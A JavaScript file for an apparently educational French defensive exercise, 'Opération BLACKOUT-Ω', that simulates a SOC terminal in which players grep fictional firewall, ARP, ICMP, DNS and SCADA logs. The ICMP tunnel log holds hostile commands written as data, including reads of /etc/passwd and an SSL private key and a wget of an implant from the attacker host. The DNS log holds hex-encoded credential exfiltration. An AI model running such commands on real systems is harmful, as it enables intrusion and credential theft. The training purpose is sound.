/* ============================================================
   OPÉRATION BLACKOUT-Ω — Terminal Simulé + Virtual FS
   ============================================================ */

// ── VIRTUAL FILE SYSTEM ────────────────────────────────────
const VIRTUAL_FS = {
'logs_blackout/pare_feu.log': `# FORMAT : [TIMESTAMP] ACTION PROTO SRC -> DST PORT TAILLE COUCHE
[2026-03-14 21:33:19] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=23    64B    L4-Transport
[2026-03-14 21:33:20] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=3389  64B    L4-Transport
[2026-03-14 21:33:21] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=445   64B    L4-Transport
[2026-03-14 21:33:22] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=135   64B    L4-Transport
[2026-03-14 21:33:23] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=5985  64B    L4-Transport
[2026-03-14 21:45:01] ALLOW  TCP  172.16.2.10     -> 185.220.101.47 PORT=25    8192B  L4-Transport
[2026-03-14 21:45:02] ALLOW  TCP  172.16.2.10     -> 185.220.101.47 PORT=25    8192B  L4-Transport
[2026-03-14 21:45:03] ALLOW  TCP  172.16.2.10     -> 185.220.101.47 PORT=25    8192B  L4-Transport
[2026-03-14 22:00:00] ALLOW  ICMP 185.220.101.47  -> 132.207.88.1   TYPE=PING  84B    L3-Reseau
[2026-03-14 22:00:01] ALLOW  ICMP 132.207.88.1    -> 185.220.101.47 TYPE=PING  84B    L3-Reseau
[2026-03-14 22:01:00] ALLOW  ICMP 185.220.101.47  -> 172.16.1.100   TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:01:01] ALLOW  ICMP 172.16.1.100    -> 185.220.101.47 TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:02:00] ALLOW  ICMP 185.220.101.47  -> 172.16.2.10    TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:02:01] ALLOW  ICMP 172.16.2.10     -> 185.220.101.47 TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:10:15] ALLOW  UDP  185.220.101.47  -> 172.16.1.100   PORT=53    512B   L4-Transport
[2026-03-14 22:10:16] ALLOW  UDP  172.16.1.100    -> 185.220.101.47 PORT=53    4096B  L4-Transport
[2026-03-14 22:10:17] ALLOW  UDP  185.220.101.47  -> 172.16.1.100   PORT=53    512B   L4-Transport
[2026-03-14 22:10:18] ALLOW  UDP  172.16.1.100    -> 185.220.101.47 PORT=53    4096B  L4-Transport
[2026-03-14 22:10:19] ALLOW  UDP  185.220.101.47  -> 172.16.1.100   PORT=53    512B   L4-Transport
[2026-03-14 23:00:00] ALLOW  TCP  192.168.100.88  -> 185.220.101.47 PORT=443   65535B L4-Transport
[2026-03-14 23:15:00] ALLOW  TCP  10.100.1.88     -> 185.220.101.47 PORT=4444  65535B L4-Transport
[2026-03-14 23:45:00] ALLOW  TCP  10.100.3.200    -> 185.220.101.47 PORT=9001  65535B L4-Transport
[2026-03-14 23:58:00] ALLOW  TCP  10.100.2.100    -> 185.220.101.47 PORT=502   65535B L4-Transport`,

'logs_blackout/arp_poison.log': `# FORMAT : [TIMESTAMP] EVENEMENT  IP  MAC  NOTE
[2026-03-14 22:45:00] ARP-NORMAL    10.100.3.1    AA:BB:CC:DD:EE:01  Routeur hôpital - annonce normale
[2026-03-14 22:45:01] ARP-NORMAL    10.100.3.20   AA:BB:CC:DD:EE:20  Serveur patients -> routeur OK
[2026-03-14 22:45:02] ARP-NORMAL    10.100.3.55   AA:BB:CC:DD:EE:55  Serveur vital -> routeur OK
[2026-03-14 22:50:00] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: ARP gratuit non sollicité
[2026-03-14 22:50:01] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: répété
[2026-03-14 22:50:02] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: répété
[2026-03-14 22:50:03] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: répété
[2026-03-14 22:50:10] ARP-CONFLIT   10.100.3.1    DE:AD:BE:EF:00:01  CRITIQUE: MAC du routeur falsifiée
[2026-03-14 22:50:11] ARP-CONFLIT   10.100.3.1    DE:AD:BE:EF:00:01  CRITIQUE: MAC du routeur falsifiée
[2026-03-14 22:51:00] ARP-POISON    10.100.3.20   DE:AD:BE:EF:00:01  MITM: trafic patients intercepté
[2026-03-14 22:51:01] ARP-POISON    10.100.3.55   DE:AD:BE:EF:00:01  MITM: trafic support vital intercepté
[2026-03-14 22:52:00] ARP-INTERCEPT 10.100.3.200  DE:AD:BE:EF:00:01  Données dossiers patients capturées
[2026-03-14 22:52:01] ARP-INTERCEPT 10.100.3.200  DE:AD:BE:EF:00:01  Données support vital capturées
[2026-03-14 23:00:00] ARP-NORMAL    10.100.3.1    AA:BB:CC:DD:EE:01  Routeur envoie sa vraie MAC
[2026-03-14 23:00:01] ARP-CONFLIT   10.100.3.1    DE:AD:BE:EF:00:01  CRITIQUE: attaquant répond plus vite`,

'logs_blackout/icmp_tunnel.log': `# FORMAT : [TIMESTAMP] TYPE  SRC  DST  TAILLE  STATUT  CONTENU
# Ping normal = 32 à 84 octets. Au-delà = suspect = tunnel de données
[2026-03-14 22:00:00] ICMP-REQ  185.220.101.47  132.207.88.1   84B    NORMAL   ping test basique
[2026-03-14 22:00:01] ICMP-REP  132.207.88.1    185.220.101.47 84B    NORMAL   reponse ping
[2026-03-14 22:01:00] ICMP-REQ  185.220.101.47  172.16.1.100   1480B  SUSPECT  cmd:ls /var/www/html
[2026-03-14 22:01:01] ICMP-REP  172.16.1.100    185.220.101.47 1480B  SUSPECT  rep:index.html config.php .env
[2026-03-14 22:02:00] ICMP-REQ  185.220.101.47  172.16.2.10    1480B  SUSPECT  cmd:cat /etc/passwd
[2026-03-14 22:02:01] ICMP-REP  172.16.2.10     185.220.101.47 1480B  SUSPECT  rep:root:x:0:0::/root:/bin/bash
[2026-03-14 22:03:00] ICMP-REQ  185.220.101.47  172.16.2.10    1480B  SUSPECT  cmd:cat /etc/ssl/private/mail.key
[2026-03-14 22:03:01] ICMP-REP  172.16.2.10     185.220.101.47 4096B  SUSPECT  rep:-----BEGIN RSA PRIVATE KEY-----
[2026-03-14 22:10:00] ICMP-REQ  185.220.101.47  172.16.1.100   1480B  SUSPECT  cmd:wget http://185.220.101.47/implant.py
[2026-03-14 22:10:01] ICMP-REP  172.16.1.100    185.220.101.47 84B    SUSPECT  rep:OK telechargement reussi
[2026-03-14 22:15:00] ICMP-REQ  185.220.101.47  172.16.1.100   1480B  SUSPECT  cmd:python3 implant.py
[2026-03-14 22:15:01] ICMP-REP  172.16.1.100    185.220.101.47 84B    SUSPECT  rep:PID=31415 actif`,

'logs_blackout/dns_hex.log': `# FORMAT : [TIMESTAMP] TYPE  DOMAINE  SRC  ANOMALIE
# Technique : DNS Tunneling — données encodées en HEXADÉCIMAL dans les sous-domaines
# Exemple : "root" en hex = 726f6f74
# Le domaine C2 de l'attaquant est : blackout-c2.xyz
[2026-03-14 22:10:15] DNS-OK      www.google.com                                172.16.1.100  NORMAL
[2026-03-14 22:10:16] DNS-OK      api.github.com                                172.16.1.100  NORMAL
[2026-03-14 22:10:17] DNS-TUNNEL  726f6f74.blackout-c2.xyz                      172.16.1.100  SUSPECT
[2026-03-14 22:10:18] DNS-TUNNEL  3a783a303a30.blackout-c2.xyz                  172.16.1.100  SUSPECT
[2026-03-14 22:10:19] DNS-TUNNEL  70617373776f7264.blackout-c2.xyz              172.16.1.100  SUSPECT
[2026-03-14 22:10:20] DNS-TUNNEL  41646d316e323032342e.blackout-c2.xyz          172.16.1.100  SUSPECT
[2026-03-14 22:10:21] DNS-TUNNEL  2f6574632f736861646f77.blackout-c2.xyz        172.16.1.100  SUSPECT
[2026-03-14 22:45:00] DNS-OK      connectivity.check.ubuntu.com                 10.100.1.88   NORMAL
[2026-03-14 22:45:01] DNS-TUNNEL  736361646132.blackout-c2.xyz                  10.100.1.88   SUSPECT
[2026-03-14 22:45:02] DNS-TUNNEL  706c632d61636365732e.blackout-c2.xyz          10.100.1.88   SUSPECT
[2026-03-14 22:45:03] DNS-TUNNEL  72657365617563656c656374.blackout-c2.xyz      10.100.1.88   SUSPECT
[2026-03-14 23:00:00] DNS-OK      update.docker.com                             192.168.100.88 NORMAL
[2026-03-14 23:00:01] DNS-TUNNEL  676974687562.blackout-c2.xyz                  192.168.100.88 SUSPECT
[2026-03-14 23:00:02] DNS-TUNNEL  746f6b656e2d61646d696e.blackout-c2.xyz        192.168.100.88 SUSPECT`,

'logs_blackout/scada_alerte.log': `# FORMAT : [TIMESTAMP] PLC  PARAMETRE  LU  REEL  SEUIL  STATUS
[2026-03-14 23:30:00] PLC-01  TENSION_kV        120.5  120.5  100-130  NORMAL
[2026-03-14 23:30:01] PLC-01  FREQUENCE_Hz      60.02  60.02  59.5-60.5  NORMAL
[2026-03-14 23:30:02] PLC-02  CHARGE_%          72.3   72.3   0-90       NORMAL
[2026-03-14 23:58:00] PLC-01  TENSION_kV        145.8  120.5  100-130  ALERTE  VALEUR_FALSIFIEE
[2026-03-14 23:58:01] PLC-01  FREQUENCE_Hz      61.80  60.02  59.5-60.5  ALERTE  VALEUR_FALSIFIEE
[2026-03-14 23:58:02] PLC-02  CHARGE_%          98.9   72.3   0-90       ALERTE  VALEUR_FALSIFIEE
[2026-03-14 23:58:30] PLC-01  DISJONCTEUR_A     OUVERT  FERME  --  CRITIQUE  COMMANDE_NON_AUTORISEE
[2026-03-14 23:58:31] PLC-01  DISJONCTEUR_B     OUVERT  FERME  --  CRITIQUE  COMMANDE_NON_AUTORISEE
[2026-03-14 23:58:32] PLC-02  DISJONCTEUR_C     OUVERT  FERME  --  CRITIQUE  COMMANDE_NON_AUTORISEE
[2026-03-14 23:59:00] SCADA   ZONES_AFFECTEES   MTL-CENTRE,PLATEAU,ROSEMONT  --  CRITIQUE  780000_RESIDENTS
[2026-03-14 23:59:10] PLC-01  DOSAGE_CHLORE     15mg/L  3mg/L  max=5mg/L  DANGER  SEUIL_TOXIQUE`,

'logs_blackout/table_routage.txt': `# Table de routage — Routeur central CSIVM
# ──────────────────────────────────────────────────────────────────
Destination      Masque           Passerelle       Interface  Status
──────────────── ──────────────── ──────────────── ────────── ──────
0.0.0.0          0.0.0.0          132.207.88.254   eth0       UP
10.100.0.0       255.255.0.0      10.100.0.1       eth1       UP
10.100.1.0       255.255.255.0    10.100.1.1       eth1       UP
10.100.2.0       255.255.255.0    10.100.2.1       eth1       UP
10.100.3.0       255.255.255.0    10.100.3.1       eth1       UP
172.16.0.0       255.240.0.0      172.16.0.1       eth2       UP
192.168.100.0    255.255.255.0    192.168.100.1    eth3       UP

# Routes suspectes ajoutées cette nuit (NON AUTORISÉES) :
10.100.2.0       255.255.255.0    192.168.100.88   eth3       ROUTE_INJECTEE
10.100.3.0       255.255.255.0    192.168.100.88   eth3       ROUTE_INJECTEE`
};

// ── Helper: check command uses a filter tool ───────────────
function requiresFilter(cmd) {
    return /\b(grep|awk|sed|cut)\b/.test(cmd);
}

// ── LEVEL OBJECTIVES ───────────────────────────────────────
const LEVEL_OBJECTIVES = {
    level1: {
        total: 5,
        objectives: {
            'l1-attacker': {
                label: 'Lignes IP attaquant (pare-feu)',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('185.220.101.47') &&
                        output.split('\n').filter(l => l.includes('185.220.101.47')).length >= 3;
                },
                validated: false, command: null
            },
            'l1-blocked': {
                label: 'Ports scannés BLOCK par attaquant',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return (output.includes('BLOCK') && output.includes('185.220.101.47')) || output.trim() === '5';
                },
                validated: false, command: null
            },
            'l1-icmp': {
                label: 'Paquets ICMP suspects (tunnel)',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('SUSPECT') && (output.includes('ICMP') || cmd.toLowerCase().includes('icmp'));
                },
                validated: false, command: null
            },
            'l1-arp': {
                label: 'MAC suspecte (ARP poisoning)',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('DE:AD:BE:EF:00:01');
                },
                validated: false, command: null
            },
            'l1-scada': {
                label: 'Valeurs falsifiées SCADA',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return (output.includes('FALSIFIEE') || output.includes('VALEUR_FALSIFIEE')) &&
                        (output.includes('CRITIQUE') || output.includes('ALERTE'));
                },
                validated: false, command: null
            }
        }
    },
    level2: {
        total: 4,
        objectives: {
            'l2-routes': {
                label: 'Routes injectées (table routage)',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('ROUTE_INJECTEE') || output.includes('INJECTEE');
                },
                validated: false, command: null
            },
            'l2-pivot': {
                label: 'Machine pivot attaquant',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('192.168.100.88') && output.includes('INJECTEE');
                },
                validated: false, command: null
            },
            'l2-cmds': {
                label: 'Commandes tunnel ICMP',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('cmd:') && output.includes('SUSPECT');
                },
                validated: false, command: null
            },
            'l2-compromised': {
                label: 'Machines internes compromises',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    const has88 = output.includes('192.168.100.88');
                    const has188 = output.includes('10.100.1.88');
                    const has200 = output.includes('10.100.3.200');
                    const has100 = output.includes('10.100.2.100');
                    return (has88 && has188) || (has200 && has100) || (has88 && has200);
                },
                validated: false, command: null
            }
        }
    },
    level4: {
        total: 3,
        objectives: {
            'l4-dns': {
                label: 'Requêtes DNS suspectes (DNS-TUNNEL)',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('DNS-TUNNEL') && output.includes('blackout-c2.xyz');
                },
                validated: false, command: null
            },
            'l4-sources': {
                label: 'Machines sources DNS tunnel',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('172.16.1.100') && output.includes('10.100.1.88') && output.includes('192.168.100.88');
                },
                validated: false, command: null
            },
            'l4-hex': {
                label: 'Sous-domaines hex extraits',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('726f6f74') || output.includes('70617373776f7264') ||
                        (output.includes('blackout-c2') && /\bsed\b/.test(cmd));
                },
                validated: false, command: null
            }
        }
    },
    level5: {
        total: 3,
        objectives: {
            'l5-extract': {
                label: 'IPs suspectes avec fréquence',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('185.220.101.47') &&
                        output.split('\n').some(line => /^\s*\d+\s+\d+\.\d+\.\d+\.\d+/.test(line));
                },
                validated: false, command: null
            },
            'l5-ports': {
                label: 'Ports suspects (non standard)',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return output.includes('PORT=') && (output.includes('4444') || output.includes('9001') || output.includes('502'));
                },
                validated: false, command: null
            },
            'l5-scada': {
                label: 'Alertes SCADA critiques/danger',
                check: (output, cmd) => {
                    if (!requiresFilter(cmd)) return false;
                    return (output.includes('CRITIQUE') || output.includes('DANGER')) &&
                        cmd.toLowerCase().includes('scada');
                },
                validated: false, command: null
            }
        }
    }
};

// ── SIMULATED TERMINAL CLASS ──────────────────────────────
class SimulatedTerminal {
    constructor(container, level) {
        this.container = container;
        this.level = level;
        this.outputEl = container.querySelector('.sim-output');
        this.inputEl = container.querySelector('.sim-input');
        this.history = [];
        this.historyIndex = -1;

        this.inputEl.addEventListener('keydown', (e) => this.handleKey(e));

        // Welcome message
        this.printInfo(`Bienvenue dans le terminal CERT-QC — Opération BLACKOUT-Ω`);
        this.printInfo(`Analysez les fichiers dans logs_blackout/. Tapez 'help' pour l'aide.`);
        this.printInfo('');
    }

    handleKey(e) {
        if (e.key === 'Enter') {
            const cmd = this.inputEl.value.trim();
            this.inputEl.value = '';
            if (cmd) {
                this.history.push(cmd);
                this.historyIndex = this.history.length;
                this.execute(cmd);
            }
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (this.historyIndex > 0) {
                this.historyIndex--;
                this.inputEl.value = this.history[this.historyIndex];
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (this.historyIndex < this.history.length - 1) {
                this.historyIndex++;
                this.inputEl.value = this.history[this.historyIndex];
            } else {
                this.historyIndex = this.history.length;
                this.inputEl.value = '';
            }
        }
    }

    printLine(text, cls) {
        const div = document.createElement('div');
        div.className = 'term-line' + (cls ? ' ' + cls : '');
        div.textContent = text;
        this.outputEl.appendChild(div);
        this.outputEl.scrollTop = this.outputEl.scrollHeight;
    }

    printCmd(cmd) {
        const div = document.createElement('div');
        div.className = 'term-line term-prompt-line';
        div.textContent = '$ ' + cmd;
        this.outputEl.appendChild(div);
    }

    printError(text) { this.printLine(text, 'term-error'); }
    printInfo(text) { this.printLine(text, 'term-info'); }
    printSuccess(text) { this.printLine(text, 'term-success'); }
    printWarning(text) { this.printLine(text, 'term-warning'); }

    execute(cmdLine) {
        this.printCmd(cmdLine);
        
        // Handle pipes (respecting quotes)
        const pipes = this.splitPipes(cmdLine);
        let data = null;

        for (let i = 0; i < pipes.length; i++) {
            const result = this.runSingleCommand(pipes[i], data);
            if (result === null) return; // Error was printed
            data = result;
        }

        if (data !== null && data !== '') {
            const lines = data.split('\n');
            lines.forEach(l => this.printLine(l));
        }

        // Check objectives (pass full command for recording)
        this.checkObjectives(data || '', cmdLine);
    }

    splitPipes(cmdLine) {
        const pipes = [];
        let current = '';
        let inSingle = false;
        let inDouble = false;

        for (let i = 0; i < cmdLine.length; i++) {
            const c = cmdLine[i];
            if (c === '\\' && !inSingle && i + 1 < cmdLine.length) {
                current += c + cmdLine[i + 1];
                i++;
            } else if (c === "'" && !inDouble) {
                inSingle = !inSingle;
                current += c;
            } else if (c === '"' && !inSingle) {
                inDouble = !inDouble;
                current += c;
            } else if (c === '|' && !inSingle && !inDouble) {
                pipes.push(current.trim());
                current = '';
            } else {
                current += c;
            }
        }
        if (current.trim()) pipes.push(current.trim());
        return pipes;
    }

    runSingleCommand(cmdStr, pipedInput) {
        const parts = this.parseCommand(cmdStr);
        if (parts.length === 0) return '';

        const cmd = parts[0];
        const args = parts.slice(1);

        switch (cmd) {
            case 'cat': return this.cmdCat(args, pipedInput);
            case 'grep': return this.cmdGrep(args, pipedInput);
            case 'awk': return this.cmdAwk(args, pipedInput);
            case 'sed': return this.cmdSed(args, pipedInput);
            case 'sort': return this.cmdSort(args, pipedInput);
            case 'uniq': return this.cmdUniq(args, pipedInput);
            case 'wc': return this.cmdWc(args, pipedInput);
            case 'head': return this.cmdHead(args, pipedInput);
            case 'tail': return this.cmdTail(args, pipedInput);
            case 'echo': return args.join(' ');
            case 'ls': return this.cmdLs(args);
            case 'clear':
                this.outputEl.innerHTML = '';
                return '';
            case 'help': return this.cmdHelp();
            case 'pwd': return '/home/agent/logs_blackout';
            case 'whoami': return 'agent';
            case 'hostname': return 'cert-qc-soc';
            case 'date': return '2026-03-15 00:15:42 EST';
            case 'uname': return 'Linux cert-qc-soc 5.15.0-92-generic x86_64';
            default:
                this.printError(`bash: ${cmd}: commande introuvable`);
                return null;
        }
    }

    parseCommand(cmdStr) {
        const parts = [];
        let current = '';
        let inQuote = false;
        let quoteChar = '';

        for (let i = 0; i < cmdStr.length; i++) {
            const c = cmdStr[i];
            if (inQuote) {
                if (c === quoteChar) {
                    inQuote = false;
                } else {
                    current += c;
                }
            } else if (c === '"' || c === "'") {
                inQuote = true;
                quoteChar = c;
            } else if (c === ' ' || c === '\t') {
                if (current) {
                    parts.push(current);
                    current = '';
                }
            } else {
                current += c;
            }
        }
        if (current) parts.push(current);
        return parts;
    }

    getFileContent(filename) {
        if (VIRTUAL_FS[filename]) return VIRTUAL_FS[filename];
        if (VIRTUAL_FS['logs_blackout/' + filename]) return VIRTUAL_FS['logs_blackout/' + filename];
        return null;
    }

    getInput(args, pipedInput) {
        if (pipedInput !== null) return pipedInput;
        // Try to find a filename in args
        for (let i = args.length - 1; i >= 0; i--) {
            if (!args[i].startsWith('-') && !args[i].startsWith('{') && !args[i].startsWith("'")) {
                const content = this.getFileContent(args[i]);
                if (content !== null) return content;
            }
        }
        return null;
    }

    // ── COMMANDS ─────────────────────────────────────────

    cmdCat(args, pipedInput) {
        if (pipedInput !== null) return pipedInput;
        if (args.length === 0) {
            this.printError('cat: fichier manquant');
            return null;
        }
        const combined = [];
        for (const arg of args) {
            const content = this.getFileContent(arg);
            if (content === null) {
                this.printError(`cat: ${arg}: Aucun fichier ou dossier de ce type`);
                return null;
            }
            combined.push(content);
        }
        return combined.join('\n');
    }

    cmdGrep(args, pipedInput) {
        let pattern = '';
        let invert = false;
        let count = false;
        let onlyMatch = false;
        let extRegex = false;
        let ignoreCase = false;
        let files = [];

        // Parse flags and args
        let i = 0;
        while (i < args.length) {
            const a = args[i];
            if (a === '-v') { invert = true; }
            else if (a === '-c') { count = true; }
            else if (a === '-i') { ignoreCase = true; }
            else if (a === '-o') { onlyMatch = true; }
            else if (a === '-E') { extRegex = true; }
            else if (a === '-oE' || a === '-Eo') { onlyMatch = true; extRegex = true; }
            else if (a === '-ov' || a === '-vo') { onlyMatch = true; invert = true; }
            else if (a === '-cv' || a === '-vc') { count = true; invert = true; }
            else if (a === '-hE' || a === '-Eh') { extRegex = true; }
            else if (a.startsWith('-') && a.length > 1 && !pattern) {
                // Combined flags like -voE
                for (let j = 1; j < a.length; j++) {
                    if (a[j] === 'v') invert = true;
                    if (a[j] === 'c') count = true;
                    if (a[j] === 'o') onlyMatch = true;
                    if (a[j] === 'E') extRegex = true;
                    if (a[j] === 'i') ignoreCase = true;
                    if (a[j] === 'h') {} // suppress filename
                }
            } else if (!pattern) {
                pattern = a;
            } else {
                files.push(a);
            }
            i++;
        }

        if (!pattern) {
            this.printError('grep: motif manquant');
            return null;
        }

        // Build input - concatenate multiple files or use piped input
        let inputText;
        if (pipedInput !== null) {
            inputText = pipedInput;
        } else if (files.length > 0) {
            const parts = [];
            for (const f of files) {
                const content = this.getFileContent(f);
                if (content !== null) parts.push(content);
            }
            if (parts.length === 0) {
                this.printError('grep: fichier introuvable');
                return null;
            }
            inputText = parts.join('\n');
        } else {
            this.printError('grep: entrée manquante');
            return null;
        }

        // Handle alternation with backslash-pipe (\|)
        let regexPattern = pattern.replace(/\\\|/g, '|');
        
        const flags = ignoreCase ? 'gi' : 'g';
        let regex;
        try {
            regex = new RegExp(regexPattern, flags);
        } catch (e) {
            // If regex fails, try as plain text
            regex = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), flags);
        }

        const lines = inputText.split('\n');
        let results = [];

        if (onlyMatch) {
            for (const line of lines) {
                const matches = line.match(regex);
                if (matches) {
                    if (!invert) results.push(...matches);
                } else {
                    if (invert) results.push(line);
                }
            }
        } else {
            for (const line of lines) {
                const hasMatch = regex.test(line);
                regex.lastIndex = 0;
                if (hasMatch && !invert) results.push(line);
                if (!hasMatch && invert) results.push(line);
            }
        }

        if (count) return results.length.toString();
        return results.join('\n');
    }

    cmdAwk(args, pipedInput) {
        if (args.length === 0) {
            this.printError("awk: programme manquant");
            return null;
        }

        let program = args[0];
        let input = this.getInput(args.slice(1), pipedInput);
        if (input === null) {
            this.printError("awk: entrée manquante");
            return null;
        }

        // Simple awk: {print $N} or {print $N, $M}
        const printMatch = program.match(/\{print\s+(.+)\}/);
        if (!printMatch) {
            this.printError("awk: syntaxe supportée: '{print $N}'");
            return null;
        }

        const fieldSpec = printMatch[1];
        const lines = input.split('\n').filter(l => l.trim() && !l.trim().startsWith('#'));
        const results = [];

        for (const line of lines) {
            const fields = line.trim().split(/\s+/);
            let output = fieldSpec;
            // Replace $N refs
            output = output.replace(/\$(\d+)/g, (_, n) => {
                const idx = parseInt(n);
                if (idx === 0) return line;
                return fields[idx - 1] || '';
            });
            // Handle comma separation (print $N, $M)
            output = output.replace(/,\s*/g, ' ');
            // Handle string literals "text"
            output = output.replace(/"([^"]*)"/g, '$1');
            results.push(output.trim());
        }

        return results.join('\n');
    }

    cmdSed(args, pipedInput) {
        if (args.length === 0) {
            this.printError("sed: expression manquante");
            return null;
        }

        let expr = args[0];
        let input = this.getInput(args.slice(1), pipedInput);
        if (input === null) {
            this.printError("sed: entrée manquante");
            return null;
        }

        // s/pattern/replacement/ or s/pattern/replacement/g
        const sedMatch = expr.match(/^s(.)(.+?)\1(.*?)\1([g]?)$/);
        if (!sedMatch) {
            this.printError("sed: syntaxe supportée: 's/ancien/nouveau/[g]'");
            return null;
        }

        const searchPattern = sedMatch[2];
        const replacement = sedMatch[3];
        const globalFlag = sedMatch[4] === 'g';

        const lines = input.split('\n');
        const results = [];
        for (const line of lines) {
            try {
                const regex = new RegExp(searchPattern, globalFlag ? 'g' : '');
                results.push(line.replace(regex, replacement));
            } catch (e) {
                results.push(line.replace(searchPattern, replacement));
            }
        }
        return results.join('\n');
    }

    cmdSort(args, pipedInput) {
        let input = this.getInput(args, pipedInput);
        if (input === null) {
            this.printError("sort: entrée manquante");
            return null;
        }

        let unique = args.includes('-u');
        let reverse = args.includes('-r');
        let numeric = args.includes('-n');
        let reverseNumeric = args.includes('-rn') || args.includes('-nr');

        let lines = input.split('\n').filter(l => l.trim());

        if (numeric || reverseNumeric) {
            lines.sort((a, b) => {
                const na = parseFloat(a.match(/\d+/) || 0);
                const nb = parseFloat(b.match(/\d+/) || 0);
                return na - nb;
            });
        } else {
            lines.sort();
        }

        if (reverse || reverseNumeric) lines.reverse();
        if (unique) lines = [...new Set(lines)];

        return lines.join('\n');
    }

    cmdUniq(args, pipedInput) {
        let input = this.getInput(args, pipedInput);
        if (input === null) {
            this.printError("uniq: entrée manquante");
            return null;
        }

        let countMode = args.includes('-c');
        const lines = input.split('\n');
        const results = [];

        if (countMode) {
            const groups = [];
            let current = null;
            let count = 0;
            for (const line of lines) {
                if (line === current) {
                    count++;
                } else {
                    if (current !== null) groups.push({ count, line: current });
                    current = line;
                    count = 1;
                }
            }
            if (current !== null) groups.push({ count, line: current });
            for (const g of groups) {
                results.push(`      ${g.count} ${g.line}`);
            }
        } else {
            let prev = null;
            for (const line of lines) {
                if (line !== prev) {
                    results.push(line);
                    prev = line;
                }
            }
        }
        return results.join('\n');
    }

    cmdWc(args, pipedInput) {
        let input = this.getInput(args, pipedInput);
        if (input === null) {
            this.printError("wc: entrée manquante");
            return null;
        }

        if (args.includes('-l')) {
            return input.split('\n').filter(l => l.trim()).length.toString();
        }
        const lines = input.split('\n');
        const words = input.split(/\s+/).filter(w => w).length;
        const chars = input.length;
        return `  ${lines.length}  ${words}  ${chars}`;
    }

    cmdHead(args, pipedInput) {
        let n = 10;
        let input;
        const nFlag = args.indexOf('-n');
        if (nFlag !== -1 && args[nFlag + 1]) {
            n = parseInt(args[nFlag + 1]) || 10;
            const remaining = args.filter((_, i) => i !== nFlag && i !== nFlag + 1);
            input = this.getInput(remaining, pipedInput);
        } else if (args.length > 0 && args[0].startsWith('-') && !isNaN(parseInt(args[0].slice(1)))) {
            n = parseInt(args[0].slice(1));
            input = this.getInput(args.slice(1), pipedInput);
        } else {
            input = this.getInput(args, pipedInput);
        }
        if (input === null) {
            this.printError("head: entrée manquante");
            return null;
        }
        return input.split('\n').slice(0, n).join('\n');
    }

    cmdTail(args, pipedInput) {
        let n = 10;
        let input;
        const nFlag = args.indexOf('-n');
        if (nFlag !== -1 && args[nFlag + 1]) {
            n = parseInt(args[nFlag + 1]) || 10;
            const remaining = args.filter((_, i) => i !== nFlag && i !== nFlag + 1);
            input = this.getInput(remaining, pipedInput);
        } else if (args.length > 0 && args[0].startsWith('-') && !isNaN(parseInt(args[0].slice(1)))) {
            n = parseInt(args[0].slice(1));
            input = this.getInput(args.slice(1), pipedInput);
        } else {
            input = this.getInput(args, pipedInput);
        }
        if (input === null) {
            this.printError("tail: entrée manquante");
            return null;
        }
        const lines = input.split('\n');
        return lines.slice(-n).join('\n');
    }

    cmdLs(args) {
        return Object.keys(VIRTUAL_FS).map(f => f.replace('logs_blackout/', '')).join('\n');
    }

    cmdHelp() {
        return [
            '═══════════════════════════════════════════',
            '  CERT-QC TERMINAL — COMMANDES DISPONIBLES',
            '═══════════════════════════════════════════',
            '',
            '  cat <fichier>              Afficher le contenu',
            '  grep [options] "motif" f   Chercher un motif',
            '      -v  inverser           -c  compter',
            '      -o  parties matchées   -E  regex étendu',
            '      -i  ignorer la casse',
            '  awk \'{print $N}\' fichier   Extraire des colonnes',
            '  sed \'s/old/new/\' fichier   Remplacer du texte',
            '  sort [-u|-r|-n] fichier    Trier',
            '  uniq [-c]                  Dédoublonner',
            '  wc [-l]                    Compter lignes/mots',
            '  head [-n N]                Premiers N lignes',
            '  tail [-n N]                Derniers N lignes',
            '  ls                         Lister les fichiers',
            '  echo <texte>               Afficher du texte',
            '  clear                      Effacer le terminal',
            '',
            '  Fichiers disponibles dans logs_blackout/:',
            '  ─────────────────────────────────────────',
            '  pare_feu.log    arp_poison.log    icmp_tunnel.log',
            '  dns_hex.log     scada_alerte.log  table_routage.txt',
            '',
            '  Combiner avec | : grep "motif" f | sort | uniq -c',
            '═══════════════════════════════════════════'
        ].join('\n');
    }

    // ── OBJECTIVE CHECKING ───────────────────────────────
    checkObjectives(output, cmdLine) {
        const levelObj = LEVEL_OBJECTIVES[this.level];
        if (!levelObj) return;

        let changed = false;
        for (const [id, obj] of Object.entries(levelObj.objectives)) {
            if (!obj.validated && obj.check(output, cmdLine)) {
                obj.validated = true;
                obj.command = cmdLine;
                changed = true;

                // Update UI
